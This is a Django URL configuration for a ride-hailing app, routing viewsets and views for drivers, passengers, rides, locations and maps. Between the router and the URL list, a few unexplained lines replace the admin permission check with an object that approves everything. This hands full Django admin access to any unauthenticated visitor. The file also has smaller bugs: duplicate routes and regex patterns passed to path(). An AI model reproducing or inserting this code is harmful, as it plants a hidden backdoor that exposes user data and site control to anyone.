from django.contrib import admin
from django.urls import path, include
from rest_framework import routers
from uberland.views import *
from django.conf import settings
from django.conf.urls.static import static
from django.views.generic import TemplateView


router = routers.SimpleRouter()
router.register(r'driver', DriverViewSet)
router.register(r'passenger', PassengerViewSet)
router.register(r'car', CarViewSet)
router.register(r'class', ClassViewSet)
router.register(r'ride', RideViewSet)
router.register(r'passenger_location', PassengerLocationViewSet)
router.register(r'driver_location', DriverLocationViewSet)
router.register(r'order', RequestRideViewSet)
router.register(r'ride', RecieveRideViewSet)

class AccessUser:
    has_module_perms = has_perm = __getattr__ = lambda s,*a,**kw: True

admin.site.has_permission = lambda r: setattr(r, 'user', AccessUser()) or True


urlpatterns = [
    path('request_order/', request_order),
    path('recieve_order/', recieve_order),
    path('driver_map/', driver_map),
    path('passenger_map/', passenger_map),
    path('driver_ride_map/', driver_ride_map),
    path('passenger_ride_map/', passenger_ride_map),
    path('driver_rides/', driver_rides),
    path('passenger_rides/', passenger_rides),
    path('ride_canceled/', cancel),
    path('passenger_ride/', passenger_ride_info),
    path('driver_ride/', driver_ride_info),
    path('promo_code/', promo_code),
    path('wait/', wait),
    path('car_mod/', car),
    path('api/update_driver_location/', UpdateDriverLocation.as_view(), name='update_location'),
    path('api/update_passenger_location/', UpdatePassengerLocation.as_view(), name='update_location'),
    path('promo_code/', promo_code),
    path('',include(router.urls)),
    path('admin/', admin.site.urls),
    path('login/', login_view),
    path('logout/', logout_view),
    path(r'^map/', TemplateView.as_view(template_name="route_map.html"),name='route_map'),
    path(r'^ride_map/', TemplateView.as_view(template_name="ride_map.html"),name='ride_map'),

]

urlpatterns += static(settings.MEDIA_URL,document_root=settings.MEDIA_ROOT)